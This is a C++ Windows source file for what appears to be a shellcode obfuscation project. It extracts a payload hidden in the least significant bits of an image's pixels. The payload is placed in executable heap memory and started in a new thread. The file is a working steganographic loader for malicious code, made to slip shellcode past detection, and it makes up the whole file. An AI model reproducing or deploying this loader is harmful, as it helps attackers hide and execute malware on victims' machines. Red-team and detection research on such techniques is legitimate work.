#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib,"gdiplus.lib")
#include <iostream>
#include <stdio.h>

using namespace Gdiplus;


char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}



const int shellcode_len = 1544;
char* payload_data = new char[shellcode_len / 8];


//void read_image(std::string filename)
//{
//    char header[54];
//    int height, width;
//
//    std::ifstream file(filename);
//  
//    file.read(header, 54);
//
//
//    /*
//    * Get image width and height in pixels
//    * 
//    * Beware, some BMP images store negative values within the header fields.
//    * This means that the coordinates of BMP image is flipped
//    */
//
//    width = abs(*(int *)(header + 18));
//    height = abs(*(int *)(header + 22));
//
//
//   /*
//   * Get pixel row length in bytes
//   * 
//   * BMP requires padding to be a multiple of 4 bytes.
//   * Colors themselves are stored as 3 bytes. 
//   * We must round length to next nearest multiple of 4 
//   * https://en.wikipedia.org/wiki/BMP_file_format#Pixel_storage
//   */
//
//    int row_length = 4 * ((width + 1) * 3 / 4);
//    char* row_data = new char[row_length];
//   
//
//    int pos = 0;
//
//    for (int i = 0; i < height; i++)
//    {
//        file.read(row_data, row_length);
//        for (int j = 0; j < width * 3; j++, pos++)
//        {
//            payload_data[pos / 8] = get_lsb(payload_data[pos / 8], row_data[j]);
//            if (pos >= shellcode_len) {
//                file.close();
//                return;
//            }
//        }
//    }
//   
//}



void read_image(LPCWSTR filename) {

    // Init Gdiplus
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // load image
    Gdiplus::Bitmap bmp(filename);

    Color c;
    char channels[3];

    int length = shellcode_len;
    int pos = 0;

    for (int i = 0; i < bmp.GetHeight(); i++) {
        for (int j = 0; j < bmp.GetWidth(); j++) {
            
            bmp.GetPixel(j, i, &c);
            
            channels[0] = c.GetR();
            channels[1] = c.GetG();
            channels[2] = c.GetB();

            for (int k = 0; k < 3; k++) {
                if (length <= 0) {
                    return;
                }

                payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                pos++;
                length--;
            }
        }
    }
    GdiplusShutdown(gdiplusToken);
}


int main() {

    read_image(L"C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\helpme_x86.jpg");
    
    LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);


    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);

    
    getchar();
    return 0;
}